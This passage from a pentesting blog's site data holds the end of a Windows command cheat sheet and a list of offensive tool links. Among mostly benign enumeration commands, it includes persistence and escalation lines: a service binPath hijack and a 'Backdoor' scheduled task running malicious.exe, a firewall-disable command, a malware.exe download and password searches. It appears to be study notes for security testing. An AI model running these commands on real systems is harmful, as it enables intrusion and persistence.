<span class=\"built_in\">REM</span> Display the current username\nwhoami /all                             <span class=\"built_in\">REM</span> Show detailed user information, groups, privileges, and SID\n<span class=\"built_in\">net</span> user                                <span class=\"built_in\">REM</span> List all user accounts on the local machine\n<span class=\"built_in\">net</span> localgroup administrators           <span class=\"built_in\">REM</span> List members of the Administrators group</code></pre>\n<pre><code class=\"highlight bat\">whoami /priv                            <span class=\"built_in\">REM</span> View privileges - look <span class=\"keyword\">for</span> SeImpersonaPrivilege - potato</code></pre>\n\n<br>\n\n<h3 id=\"System-Information\"><a href=\"#System-Information\" class=\"headerlink\" title=\"System Information\"></a>System Information</h3><pre><code class=\"highlight bat\">systeminfo                              <span class=\"built_in\">REM</span> Display detailed system configuration, OS version, etc.\nwmic qfe list brief /<span class=\"built_in\">format</span>:table       <span class=\"built_in\">REM</span> List installed hotfixes and patches\nwmic os get caption, version, csname    <span class=\"built_in\">REM</span> Display the Windows version, OS name, and computer name\nwmic product get name, version          <span class=\"built_in\">REM</span> List all installed software with versions (useful <span class=\"keyword\">for</span> finding vulnerable software)</code></pre>\n\n<br>\n\n<h3 id=\"Registry-Information\"><a href=\"#Registry-Information\" class=\"headerlink\" title=\"Registry Information\"></a>Registry Information</h3><pre><code class=\"highlight bat\">reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run               <span class=\"built_in\">REM</span> List programs <span class=\"built_in\">set</span> to run <span class=\"built_in\">at</span> startup\nreg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot; /v ProxyServer  <span class=\"built_in\">REM</span> Check proxy settings\nreg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v RestrictAnonymous  <span class=\"built_in\">REM</span> Check <span class=\"keyword\">if</span> anonymous enumeration of SAM accounts is restricted\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated  <span class=\"built_in\">REM</span> Check <span class=\"keyword\">if</span> MSI packages can be installed with elevated privileges</code></pre>\n\n<br>\n\n<h2 id=\"Filesystem\"><a href=\"#Filesystem\" class=\"headerlink\" title=\"Filesystem\"></a>Filesystem</h2><h2 id=\"Drivers\"><a href=\"#Drivers\" class=\"headerlink\" title=\"Drivers\"></a>Drivers</h2><pre><code class=\"highlight batch\">fsutil fsinfo drives      REM View drivers available</code></pre>\n\n<h3 id=\"Directory-and-File-Operations-with-dir\"><a href=\"#Directory-and-File-Operations-with-dir\" class=\"headerlink\" title=\"Directory and File Operations with dir\"></a>Directory and File Operations with <code>dir</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">dir</span> /A:D                                 <span class=\"built_in\">REM</span> List directories only\n<span class=\"built_in\">dir</span> /A:HS                                <span class=\"built_in\">REM</span> List hidden and system files\n<span class=\"built_in\">dir</span> /O:S                                 <span class=\"built_in\">REM</span> <span class=\"built_in\">Sort</span> files by size\n<span class=\"built_in\">dir</span> /Q                                   <span class=\"built_in\">REM</span> Show file owners\n<span class=\"built_in\">dir</span> /T:C                                 <span class=\"built_in\">REM</span> Show creation <span class=\"built_in\">time</span>\n<span class=\"built_in\">dir</span> /S /B                                <span class=\"built_in\">REM</span> Recursive search, bare <span class=\"built_in\">format</span> (useful <span class=\"keyword\">for</span> finding specific files like passwords or sensitive documents)</code></pre>\n\n<br>\n\n<h3 id=\"File-Searching-with-findstr\"><a href=\"#File-Searching-with-findstr\" class=\"headerlink\" title=\"File Searching with findstr\"></a>File Searching with <code>findstr</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">findstr</span> /si &quot;password&quot; *.txt             <span class=\"built_in\">REM</span> Search <span class=\"keyword\">for</span> the word &quot;password&quot; <span class=\"keyword\">in</span> all .txt files (case-insensitive)\n<span class=\"built_in\">findstr</span> /R /S &quot;regex_pattern&quot; *.config   <span class=\"built_in\">REM</span> Search using regular expressions across all .config files recursively</code></pre>\n\n<br>\n\n<h3 id=\"File-and-Directory-Takeover\"><a href=\"#File-and-Directory-Takeover\" class=\"headerlink\" title=\"File and Directory Takeover\"></a>File and Directory Takeover</h3><pre><code class=\"highlight bat\">takeown /F &lt;file_or_folder&gt; /A           <span class=\"built_in\">REM</span> Take ownership of a file or folder\nicacls &lt;file_or_folder&gt; /grant <span class=\"variable\">%username%</span>:F  <span class=\"built_in\">REM</span> Grant full control to the current user</code></pre>\n\n<br>\n\n<h2 id=\"Permissions\"><a href=\"#Permissions\" class=\"headerlink\" title=\"Permissions\"></a>Permissions</h2><h3 id=\"icacls-Managing-Permissions\"><a href=\"#icacls-Managing-Permissions\" class=\"headerlink\" title=\"icacls - Managing Permissions\"></a><code>icacls</code> - Managing Permissions</h3><pre><code class=\"highlight bat\">icacls &lt;file_or_folder&gt;                   <span class=\"built_in\">REM</span> Show permissions <span class=\"keyword\">for</span> a file or folder\nicacls &lt;file_or_folder&gt; /grant &lt;user&gt;:(F) <span class=\"built_in\">REM</span> Grant full control to a user\nicacls &lt;file_or_folder&gt; /deny &lt;user&gt;:(D)  <span class=\"built_in\">REM</span> Deny delete permissions to a user\nicacls &lt;file_or_folder&gt; /inheritance:e    <span class=\"built_in\">REM</span> Enable inheritance <span class=\"keyword\">for</span> a file or folder\nicacls &lt;file_or_folder&gt; /save aclfile.txt <span class=\"built_in\">REM</span> Backup ACLs to a file\nicacls &lt;file_or_folder&gt; /<span class=\"built_in\">restore</span> aclfile.txt  <span class=\"built_in\">REM</span> <span class=\"built_in\">Restore</span> ACLs from a file\nicacls &lt;file_or_folder&gt; /reset            <span class=\"built_in\">REM</span> Reset permissions to default</code></pre>\n<pre><code class=\"highlight batch\">F    : Full control  Grants complete access to the file or directory, including the ability to modify permissions.\nM    : Modify  Allows reading, writing, and deleting the file or directory but does not include permission changes.\nRX   : Read and execute  Allows reading the file and executing it (if it&#x27;s executable), or listing the directory and accessing its contents.\nR    : Read  Permits reading the file or listing the directory&#x27;s contents.\nW    : Write  Allows writing to the file or adding files to the directory.\nD    : Delete  Grants the ability to delete the file or directory.\nX    : Traverse  Permits moving through a directory to access other files or directories.\nS    : Synchronize  Enables synchronization of operations on the file or directory, useful for process synchronization.</code></pre>\n\n<br>\n\n<h3 id=\"Access-Control-with-accesschk\"><a href=\"#Access-Control-with-accesschk\" class=\"headerlink\" title=\"Access Control with accesschk\"></a>Access Control with <code>accesschk</code></h3><pre><code class=\"highlight bat\">accesschk.exe -uws &lt;username&gt; *           <span class=\"built_in\">REM</span> Show all objects with write access <span class=\"keyword\">for</span> a specific user (Sysinternals)\naccesschk.exe -p &lt;processname&gt;            <span class=\"built_in\">REM</span> Check permissions on a specific process (useful <span class=\"keyword\">for</span> privilege escalation)</code></pre>\n\n<br>\n\n<h2 id=\"Networking\"><a href=\"#Networking\" class=\"headerlink\" title=\"Networking\"></a>Networking</h2><h3 id=\"Network-Configuration-with-ipconfig\"><a href=\"#Network-Configuration-with-ipconfig\" class=\"headerlink\" title=\"Network Configuration with ipconfig\"></a>Network Configuration with <code>ipconfig</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">ipconfig</span> /all                             <span class=\"built_in\">REM</span> Display all network configuration\n<span class=\"built_in\">ipconfig</span> /displaydns                      <span class=\"built_in\">REM</span> Show the DNS resolver cache\n<span class=\"built_in\">ipconfig</span> /flushdns                        <span class=\"built_in\">REM</span> Flush DNS resolver cache (useful <span class=\"keyword\">for</span> clearing potential logs or testing DNS issues)\n<span class=\"built_in\">ipconfig</span> /release                         <span class=\"built_in\">REM</span> Release the current IP address\n<span class=\"built_in\">ipconfig</span> /renew                           <span class=\"built_in\">REM</span> Renew the IP address</code></pre>\n\n<br>\n\n<h3 id=\"Network-Connections-with-netstat\"><a href=\"#Network-Connections-with-netstat\" class=\"headerlink\" title=\"Network Connections with netstat\"></a>Network Connections with <code>netstat</code></h3><pre><code class=\"highlight bat\">netstat -an                               <span class=\"built_in\">REM</span> Show all active connections and listening ports\nnetstat -b                                <span class=\"built_in\">REM</span> Show the executable tied to each connection\nnetstat -r                                <span class=\"built_in\">REM</span> Show the routing table\nnetstat -o                                <span class=\"built_in\">REM</span> Show active connections with the associated process ID (PID)\nnetstat -ano | <span class=\"built_in\">findstr</span> :<span class=\"number\">80</span>                <span class=\"built_in\">REM</span> <span class=\"built_in\">Find</span> connections on port <span class=\"number\">80</span></code></pre>\n\n<br>\n\n<h3 id=\"ARP-Cache-with-arp\"><a href=\"#ARP-Cache-with-arp\" class=\"headerlink\" title=\"ARP Cache with arp\"></a>ARP Cache with <code>arp</code></h3><pre><code class=\"highlight bat\">arp -a                                    <span class=\"built_in\">REM</span> Show ARP cache\narp -d                                    <span class=\"built_in\">REM</span> Clear ARP cache</code></pre>\n\n<br>\n\n<h3 id=\"Windows-Firewall-with-netsh\"><a href=\"#Windows-Firewall-with-netsh\" class=\"headerlink\" title=\"Windows Firewall with netsh\"></a>Windows Firewall with <code>netsh</code></h3><pre><code class=\"highlight bat\">netsh advfirewall show currentprofile     <span class=\"built_in\">REM</span> Display the active firewall profile settings\nnetsh advfirewall <span class=\"built_in\">set</span> currentprofile state off  <span class=\"built_in\">REM</span> Disable the active firewall profile (requires admin)\nnetsh advfirewall firewall add rule name=&quot;Allow SSH&quot; protocol=TCP <span class=\"built_in\">dir</span>=<span class=\"keyword\">in</span> localport=<span class=\"number\">22</span> action=allow  <span class=\"built_in\">REM</span> Add a firewall rule to allow SSH on port <span class=\"number\">22</span></code></pre>\n\n<br>\n\n<h3 id=\"Shares-with-net\"><a href=\"#Shares-with-net\" class=\"headerlink\" title=\"Shares with net\"></a>Shares with <code>net</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">net</span> share                                <span class=\"built_in\">REM</span> List all shared folders on the local machine\n<span class=\"built_in\">net</span> view \\\\hostname                       <span class=\"built_in\">REM</span> List shared resources on a remote machine\n<span class=\"built_in\">net</span> use Z: \\\\hostname\\sharename /user:username password  <span class=\"built_in\">REM</span> Map a network drive using specific credentials</code></pre>\n\n<br>\n\n<h3 id=\"smbclient-for-SMB-Connections-from-Linux-Windows-with-Cygwin\"><a href=\"#smbclient-for-SMB-Connections-from-Linux-Windows-with-Cygwin\" class=\"headerlink\" title=\"smbclient for SMB Connections (from Linux&#x2F;Windows with Cygwin)\"></a><code>smbclient</code> for SMB Connections (from Linux&#x2F;Windows with Cygwin)</h3><pre><code class=\"highlight bat\">smbclient -L \\\\hostname -U username       <span class=\"built_in\">REM</span> List shares on a remote SMB server\nsmbclient //hostname/sharename -U username  <span class=\"built_in\">REM</span> Connect to a specific share</code></pre>\n\n<br>\n\n<h3 id=\"powershell-Networking\"><a href=\"#powershell-Networking\" class=\"headerlink\" title=\"powershell Networking\"></a><code>powershell</code> Networking</h3><pre><code class=\"highlight bat\">powershell &quot;Test-Connection -ComputerName hostname -Count <span class=\"number\">4</span>&quot;  <span class=\"built_in\">REM</span> <span class=\"built_in\">Ping</span> a host <span class=\"number\">4</span> times using PowerShell\npowershell &quot;Get-NetTCPConnection -State Listen&quot;  <span class=\"built_in\">REM</span> List all listening ports using PowerShell\npowershell &quot;Invoke-WebRequest -Uri http://example.com&quot;  <span class=\"built_in\">REM</span> Make a web request using PowerShell</code></pre>\n\n<br>\n\n<h2 id=\"Services\"><a href=\"#Services\" class=\"headerlink\" title=\"Services\"></a>Services</h2><h3 id=\"Service-Management-with-sc\"><a href=\"#Service-Management-with-sc\" class=\"headerlink\" title=\"Service Management with sc\"></a>Service Management with <code>sc</code></h3><pre><code class=\"highlight bat\">sc query &lt;service_name&gt;                   <span class=\"built_in\">REM</span> Query the status of a service\nsc qc &lt;service_name&gt;                      <span class=\"built_in\">REM</span> Query the service configuration (useful <span class=\"keyword\">for</span> finding paths and weak permissions)\nsc stop &lt;service_name&gt;                    <span class=\"built_in\">REM</span> Stop a service\nsc <span class=\"built_in\">start</span> &lt;service_name&gt;                   <span class=\"built_in\">REM</span> <span class=\"built_in\">Start</span> a service\nsc config &lt;service_name&gt; binPath= &quot;C:\\<span class=\"built_in\">path</span>\\to\\malicious.exe&quot;  <span class=\"built_in\">REM</span> Change the executable <span class=\"built_in\">path</span> <span class=\"keyword\">for</span> a service (privilege escalation technique)\nsc delete &lt;service_name&gt;                  <span class=\"built_in\">REM</span> Delete a service</code></pre>\n\n<br>\n\n<h3 id=\"Windows-Services-with-wmic\"><a href=\"#Windows-Services-with-wmic\" class=\"headerlink\" title=\"Windows Services with wmic\"></a>Windows Services with <code>wmic</code></h3><pre><code class=\"highlight bat\">wmic service get name, displayname, startmode, state  <span class=\"built_in\">REM</span> List all services, their display names, <span class=\"built_in\">start</span> modes, and current states\nwmic process where &quot;name=&#x27;svchost.exe&#x27;&quot; get processid, commandline  <span class=\"built_in\">REM</span> List all instances of svchost with their command lines</code></pre>\n\n<br>\n\n<h2 id=\"Task-Management\"><a href=\"#Task-Management\" class=\"headerlink\" title=\"Task Management\"></a>Task Management</h2><h3 id=\"Process-Management-with-tasklist-and-taskkill\"><a href=\"#Process-Management-with-tasklist-and-taskkill\" class=\"headerlink\" title=\"Process Management with tasklist and taskkill\"></a>Process Management with <code>tasklist</code> and <code>taskkill</code></h3><pre><code class=\"highlight bat\">tasklist                                  <span class=\"built_in\">REM</span> List all running processes\ntasklist /svc                             <span class=\"built_in\">REM</span> List services hosted <span class=\"keyword\">in</span> each svchost process\ntasklist /v                               <span class=\"built_in\">REM</span> Display detailed information about each process, including window <span class=\"built_in\">title</span>\n<span class=\"built_in\">taskkill</span> /PID &lt;PID&gt;                       <span class=\"built_in\">REM</span> Kill a process by PID\n<span class=\"built_in\">taskkill</span> /IM &lt;process_name&gt;               <span class=\"built_in\">REM</span> Kill a process by name\n<span class=\"built_in\">taskkill</span> /F /PID &lt;PID&gt;                    <span class=\"built_in\">REM</span> Forcefully kill a process by PID</code></pre>\n\n<br>\n\n<h3 id=\"Scheduling-Tasks-with-schtasks\"><a href=\"#Scheduling-Tasks-with-schtasks\" class=\"headerlink\" title=\"Scheduling Tasks with schtasks\"></a>Scheduling Tasks with <code>schtasks</code></h3><pre><code class=\"highlight bat\">schtasks /query /fo LIST /v               <span class=\"built_in\">REM</span> List all scheduled tasks with detailed information\nschtasks /create /tn &quot;Backdoor&quot; /tr &quot;C:\\<span class=\"built_in\">path</span>\\to\\malicious.exe&quot; /sc daily /st <span class=\"number\">12</span>:<span class=\"number\">00</span>  <span class=\"built_in\">REM</span> Create a scheduled task to run a malicious file daily <span class=\"built_in\">at</span> noon\nschtasks /delete /tn &quot;TaskName&quot; /f        <span class=\"built_in\">REM</span> Delete a scheduled task by name, without prompting <span class=\"keyword\">for</span> confirmation</code></pre>\n\n<br>\n\n<h2 id=\"PowerShell-Advanced-Commands\"><a href=\"#PowerShell-Advanced-Commands\" class=\"headerlink\" title=\"PowerShell - Advanced Commands\"></a>PowerShell - Advanced Commands</h2><h3 id=\"File-and-Directory-Enumeration\"><a href=\"#File-and-Directory-Enumeration\" class=\"headerlink\" title=\"File and Directory Enumeration\"></a>File and Directory Enumeration</h3><pre><code class=\"highlight bat\">Get-ChildItem -Recurse -Force | Where-Object &#123; $_.Attributes -match &quot;Hidden&quot; &#125;  <span class=\"built_in\">REM</span> List all hidden files recursively\nGet-Acl C:\\<span class=\"built_in\">path</span>\\to\\file.txt | <span class=\"built_in\">Format</span>-List  <span class=\"built_in\">REM</span> Get detailed ACL information <span class=\"keyword\">for</span> a specific file</code></pre>\n\n<br>\n\n<h3 id=\"Downloading-Files\"><a href=\"#Downloading-Files\" class=\"headerlink\" title=\"Downloading Files\"></a>Downloading Files</h3><pre><code class=\"highlight bat\">Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\\<span class=\"built_in\">path</span>\\to\\malware.exe  <span class=\"built_in\">REM</span> Download a file from a URL and save it locally</code></pre>\n\n<br>\n\n<h3 id=\"Running-Commands-Remotely\"><a href=\"#Running-Commands-Remotely\" class=\"headerlink\" title=\"Running Commands Remotely\"></a>Running Commands Remotely</h3><pre><code class=\"highlight bat\">Invoke-Command -ComputerName hostname -ScriptBlock &#123; Get-Service &#125;  <span class=\"built_in\">REM</span> Run a command on a remote computer to list services\nEnter-PSSession -ComputerName hostname  <span class=\"built_in\">REM</span> Establish an interactive session with a remote computer</code></pre>\n\n<br>\n\n<h2 id=\"Miscellaneous\"><a href=\"#Miscellaneous\" class=\"headerlink\" title=\"Miscellaneous\"></a>Miscellaneous</h2><h3 id=\"Environment-Variables\"><a href=\"#Environment-Variables\" class=\"headerlink\" title=\"Environment Variables\"></a>Environment Variables</h3><pre><code class=\"highlight bat\"><span class=\"built_in\">set</span>                                        <span class=\"built_in\">REM</span> List all environment variables\nsetx VAR_NAME &quot;Value&quot;                      <span class=\"built_in\">REM</span> <span class=\"built_in\">Set</span> a new environment variable permanently\n<span class=\"built_in\">set</span> <span class=\"built_in\">path</span>=C:\\newpath;<span class=\"variable\">%path%</span>                 <span class=\"built_in\">REM</span> Temporarily modify the <span class=\"built_in\">PATH</span> environment variable</code></pre>\n\n<br>\n\n<h3 id=\"System-Control\"><a href=\"#System-Control\" class=\"headerlink\" title=\"System Control\"></a>System Control</h3><pre><code class=\"highlight bat\">shutdown /s /f /t <span class=\"number\">0</span>                        <span class=\"built_in\">REM</span> Shutdown the computer immediately\nshutdown /r /f /t <span class=\"number\">0</span>                        <span class=\"built_in\">REM</span> Restart the computer immediately</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"Windows - Learning Resources","toc":true,"_content":"\n---\nRelevant materials and insights about penetration testing from and of a Linux environment.\n\n---\n<!-- more -->\n\n<br>\n\n## Courses \n\n| Description | Link |\n| --- | --- |\n|  |  |\n\n<br>\n\n## Blogs and explanations\n\n| Description | Link |\n| --- | --- |\n| Decoder's Blog - Windoes internals deep dive | https://decoder.cloud/ |\n| Kerberoasting attack presenation | https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf |\n| UAC no preauth Kerberos | https://harmj0y.medium.com/roasting-as-reps-e6179a65216b |\n| SNMP protocol: MIBs, OIDs | https://www.paessler.com/info/snmp_mibs_and_oids_an_overview |\n| Get creds via NTLMv2 | https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html |\n| Abuze Azore connect | https://blog.xpnsec.com/azuread-connect-for-redteam/ |\n\n\n<br>\n\n## Cheatsheets\n\n| Description | Link |\n| --- | --- |\n| The Hacker Tools | https://tools.thehacker.recipes/ |\n| Offensive security tools and commands | https://wadcoms.github.io/ |\n| Living Off The Land Binaries, Scripts and Libraries | https://lolbas-project.github.io/# |\n\n<br>\n\n## Tools\n\n| Description | Link |\n| --- | --- |\n| Generates malicious LNK file payloads for data exfiltration | https://github.com/Plazmaz/LNKUp |\n| Create an MSI package | https://emcosoftware.com/msi-package-builder/download |\n| signtool.exe installer | https://go.microsoft.com/fwlink/?LinkID=698771 |\n| JuicyPotato.exe - Win privesc | https://github.com/ohpe/juicy-potato/releases |\n| RougePotato - another Win privesc | https://github.com/antonioCoco/RoguePotato | \n| Watson - privesc based on missing KBs | https://github.com/rasta-mouse/Watson |\n| PowerSploit - PowerShell post-exploitation | https://github.com/PowerShellMafia/PowerSploit | \n| BloodHound - Six degrees of Domain Admin | https://github.com/BloodHoundAD/BloodHound |\n\n\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Windows/learning-resources.md","raw":"---\ntitle: Windows - Learning Resources\ncategories:\n  - Pentesting\n  - Windows\ntags:\n  - Pentesting\n  - Windows\n  - Learning Resources\ntoc: true\n---\n\n---\nRelevant materials and insights about penetration testing from and of a Linux environment.\n\n---\n<!-- more -->\n\n<br>\n\n## Courses \n\n| Description | Link |\n| --- | --- |\n|  |  |\n\n<br>\n\n## Blogs and explanations\n\n| Description | Link |\n| --- | --- |\n| Decoder's Blog - Windoes internals deep dive | https://decoder.cloud/ |\n| Kerberoasting attack presenation | https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf |\n| UAC no preauth Kerberos | https://harmj0y.medium.com/roasting-as-reps-e6179a65216b |\n| SNMP protocol: MIBs, OIDs | https://www.paessler.com/info/snmp_mibs_and_oids_an_overview |\n| Get creds via NTLMv2 | https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html |\n| Abuze Azore connect | https://blog.xpnsec.com/azuread-connect-for-redteam/ |\n\n\n<br>\n\n## Cheatsheets\n\n| Description | Link |\n| --- | --- |\n| The Hacker Tools | https://tools.thehacker.recipes/ |\n| Offensive security tools and commands | https://wadcoms.github.io/ |\n| Living Off The Land Binaries, Scripts and Libraries | https://lolbas-project.github.io/# |\n\n<br>\n\n## Tools\n\n| Description | Link |\n| --- | --- |\n| Generates malicious LNK file payloads for data exfiltration | https://github.com/Plazmaz/LNKUp |\n| Create an MSI package | https://emcosoftware.com/msi-package-builder/download |\n| signtool.exe installer | https://go.microsoft.com/fwlink/?LinkID=698771 |\n| JuicyPotato.exe - Win privesc | https://github.com/ohpe/juicy-potato/releases |\n| RougePotato - another Win privesc | https://github.com/antonioCoco/RoguePotato | \n| Watson - privesc based on missing KBs | https://github.com/rasta-mouse/Watson |\n| PowerSploit - PowerShell post-exploitation | https://github.com/PowerShellMafia/PowerSploit | \n| BloodHound - Six degrees of Domain Admin | https://github.com/BloodHoundAD/BloodHound |\n\n\n\n<br>\n\n---\n---","slug":"Pentesting/Windows/learning-resources","published":1,"date":"2024-09-23T06:18:55.877Z","updated":"2024-09-23T06:18:55.877Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmi5001u6gvgfn7k9mup","content":"<hr>\n<p>Relevant materials and insights about penetration testing from and of a Linux environment.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Courses\"><a href=\"#Courses\" class=\"headerlink\" title=\"Courses\"></a>Courses</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Blogs-and-explanations\"><a href=\"#Blogs-and-explanations\" class=\"headerlink\" title=\"Blogs and explanations\"></a>Blogs and explanations</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Decoders Blog - Windoes internals deep dive</td>\n<td><a href=\"https://decoder.cloud/\">https://decoder.cloud/</a></td>\n</tr>\n<tr>\n<td>Kerberoasting attack presenation</td>\n<td><a href=\"https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf\">https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf</a></td>\n</tr>\n<tr>\n<td>UAC no preauth Kerberos</td>\n<td><a href=\"https://harmj0y.medium.com/roasting-as-reps-e6179a65216b\">https://harmj0y.medium.com/roasting-as-reps-e6179a65216b</a></td>\n</tr>\n<tr>\n<td>SNMP protocol: MIBs, OIDs</td>\n<td><a href=\"https://www.paessler.com/info/snmp_mibs_and_oids_an_overview\">https://www.paessler.com/info/snmp_mibs_and_oids_an_overview</a></td>\n</tr>\n<tr>\n<td>Get creds via NTLMv2</td>\n<td><a href=\"https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html\">https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html</a></td>\n</tr>\n<tr>\n<td>Abuze Azore connect</td>\n<td><a href=\"https://blog.xpnsec.com/azuread-connect-for-redteam/\">https://blog.xpnsec.com/azuread-connect-for-redteam/</a></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Cheatsheets\"><a href=\"#Cheatsheets\" class=\"headerlink\" title=\"Cheatsheets\"></a>Cheatsheets</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>The Hacker Tools</td>\n<td><a href=\"https://tools.thehacker.recipes/\">https://tools.thehacker.recipes/</a></td>\n</tr>\n<tr>\n<td>Offensive security tools and commands</td>\n<td><a href=\"https://wadcoms.github.io/\">https://wadcoms.github.io/</a></td>\n</tr>\n<tr>\n<td>Living Off The Land Binaries, Scripts and Libraries</td>\n<td><a href=\"https://lolbas-project.github.io/#\">https://lolbas-project.github.io/#</a></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Generates malicious LNK file payloads for data exfiltration</td>\n<td><a href=\"https://github.com/Plazmaz/LNKUp\">https://github.com/Plazmaz/LNKUp</a></td>\n</tr>\n<tr>\n<td>Create an MSI package</td>\n<td><a href=\"https://emcosoftware.com/msi-package-builder/download\">https://emcosoftware.com/msi-package-builder/download</a></td>\n</tr>\n<tr>\n<td>signtool.exe installer</td>\n<td><a href=\"https://go.microsoft.com/fwlink/?LinkID=698771\">https://go.microsoft.com/fwlink/?LinkID=698771</a></td>\n</tr>\n<tr>\n<td>JuicyPotato.exe - Win privesc</td>\n<td><a href=\"https://github.com/ohpe/juicy-potato/releases\">https://github.com/ohpe/juicy-potato/releases</a></td>\n</tr>\n<tr>\n<td>RougePotato - another Win privesc</td>\n<td><a href=\"https://github.com/antonioCoco/RoguePotato\">https://github.com/antonioCoco/RoguePotato</a></td>\n</tr>\n<tr>\n<td>Watson - privesc based on missing KBs</td>\n<td><a href=\"https://github.com/rasta-mouse/Watson\">https://github.com/rasta-mouse/Watson</a></td>\n</tr>\n<tr>\n<td>PowerSploit - PowerShell post-exploitation</td>\n<td><a href=\"https://github.com/PowerShellMafia/PowerSploit\">https://github.com/PowerShellMafia/PowerSploit</a></td>\n</tr>\n<tr>\n<td>BloodHound - Six degrees of Domain Admin</td>\n<td><a href=\"https://github.com/BloodHoundAD/BloodHound\">https://github.com/BloodHoundAD/BloodHound</a></td>\n</tr>\n</tbody></table>\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Relevant materials and insights about penetration testing from and of a Linux environment.</p>\n<hr>","more":"<br>\n\n<h2 id=\"Courses\"><a href=\"#Courses\" class=\"headerlink\" title=\"Courses\"></a>Courses</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Blogs-and-explanations\"><a href=\"#Blogs-and-explanations\" class=\"headerlink\" title=\"Blogs and explanations\"></a>Blogs and explanations</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Decoders Blog - Windoes internals deep dive</td>\n<td><a href=\"https://decoder.cloud/\">https://decoder.cloud/</a></td>\n</tr>\n<tr>\n<td>Kerberoasting attack presenation</td>\n<td><a href=\"https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf\">https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf</a></td>\n</tr>\n<tr>\n<td>UAC no preauth Kerberos</td>\n<td><a href=\"https://harmj0y.medium.com/roasting-as-reps-e6179a65216b\">https://harmj0y.medium.com/roasting-as-reps-e6179a65216b</a></td>\n</tr>\n<tr>\n<td>SNMP protocol: MIBs, OIDs</td>\n<td><a href=\"https://www.paessler.com/info/snmp_mibs_and_oids_an_overview\">https://www.paessler.com/info/snmp_mibs_and_oids_an_overview</a></td>\n</tr>\n<tr>\n<td>Get creds via NTLMv2</td>\n<td><a href=\"https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html\">https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html</a></td>\n</tr>\n<tr>\n<td>Abuze Azore connect</td>\n<td><a href=\"https://blog.xpnsec.com/azuread-connect-for-redteam/\">https://blog.xpnsec.com/azuread-connect-for-redteam/</a></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Cheatsheets\"><a href=\"#Cheatsheets\" class=\"headerlink\" title=\"Cheatsheets\"></a>Cheatsheets</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>The Hacker Tools</td>\n<td><a href=\"https://tools.thehacker.recipes/\">https://tools.thehacker.recipes/</a></td>\n</tr>\n<tr>\n<td>Offensive security tools and commands</td>\n<td><a href=\"https://wadcoms.github.io/\">https://wadcoms.github.io/</a></td>\n</tr>\n<tr>\n<td>Living Off The Land Binaries, Scripts and Libraries</td>\n<td><a href=\"https://lolbas-project.github.io/#\">https://lolbas-project.github.io/#</a></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Generates malicious LNK file payloads for data exfiltration</td>\n<td><a href=\"https://github.com/Plazmaz/LNKUp\">https://github.com/Plazmaz/LNKUp</a></td>\n</tr>\n<tr>\n<td>Create an MSI package</td>\n<td><a href=\"https://emcosoftware.com/msi-package-builder/download\">https://emcosoftware.com/msi-package-builder/download</a></td>\n</tr>\n<tr>\n<td>signtool.exe installer</td>\n<td><a href=\"https://go.microsoft.com/fwlink/?LinkID=698771\">https://go.microsoft.com/fwlink/?LinkID=698771</a></td>\n</tr>\n<tr>\n<td>JuicyPotato.exe - Win privesc</td>\n<td><a href=\"https://github.com/ohpe/juicy-potato/releases\">https://github.com/ohpe/juicy-potato/releases</a></td>\n</tr>\n<tr>\n<td>RougePotato - another Win privesc</td>\n<td><a 